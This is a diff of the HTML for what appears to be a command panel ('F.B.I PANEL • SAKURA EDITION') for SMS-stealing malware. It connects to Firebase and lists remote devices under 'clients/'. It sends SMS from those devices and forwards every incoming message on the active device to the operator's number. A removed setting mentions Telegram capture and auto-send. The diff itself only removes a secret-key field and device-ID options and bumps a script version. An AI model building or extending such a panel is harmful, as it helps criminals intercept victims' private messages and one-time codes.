@@ -34,10 +34,6 @@
     <div class="setup-sub">Connect your Firebase database to unlock the F.B.I command center.</div>
     <label class="fl">Firebase Database URL</label>
     <input id="fbUrl" class="fi" placeholder="https://your-project.firebaseio.com" type="url"/>
-    <label class="fl" style="margin-top:10px">Database secret (optional — required for SMS send on locked DBs)</label>
-    <form autocomplete="off" onsubmit="return false" style="width:100%">
-    <input id="fbKey" class="fi" placeholder="Firebase Database Secret key" type="password" autocomplete="new-password"/>
-    </form>
     <button type="button" class="cta" onclick="safeConnect(event)">⚡ Connect to Firebase →</button>
     <div class="s-err" id="serr">Connection failed — check URL and key</div>
     <div class="s-footer"><span class="gold-grad">F.B.I PANEL • SAKURA EDITION</span></div>
@@ -193,7 +189,6 @@
             </div>
             <label class="fl">Message</label>
             <textarea id="dmSendMsg" class="sarea" placeholder="Type your message..."></textarea>
-            <button type="button" class="sbtn" style="margin-bottom:8px;background:rgba(255,200,80,.12);border:1px solid rgba(255,200,80,.35);font-size:11px" onclick="setPreferredSmsDeviceFromModal()">⭐ Use this device for SMS</button>
             <button class="sbtn" id="dmSendBtn" onclick="sendSmsActive()">🚀 Send Message</button>
             <div class="sres" id="dmSendRes"></div>
           </div>
@@ -256,12 +251,6 @@
         <div class="settings-title">📞 My Number (Forward Target)</div>
         <div class="settings-desc">All incoming messages on the active device will be forwarded to this number via SMS.</div>
         <input class="fi" id="setMyNumber" placeholder="+91 9876543210"/>
-      </div>
-
-      <div class="settings-section">
-        <div class="settings-title">📱 SMS sender device ID</div>
-        <div class="settings-desc">Telegram capture / auto-send isi device se jayega (jo phone par SMS deliver karta ho). Example: <code style="color:var(--gold2)">2f3e0fd1c55e12ab</code></div>
-        <input class="fi" id="setSmsDeviceId" placeholder="device id (clients/…)" autocomplete="off"/>
       </div>
 
       <div class="settings-section">
@@ -392,7 +381,7 @@
       .finally(function(){
         var s = document.createElement('script');
         var local = /^(localhost|127\.0\.0\.1)$/i.test(location.hostname);
-        s.src = local ? 'script.src.js' : 'script.js?v=2';
+        s.src = local ? 'script.src.js' : 'script.js?v=1';
         document.body.appendChild(s);
       });
   }
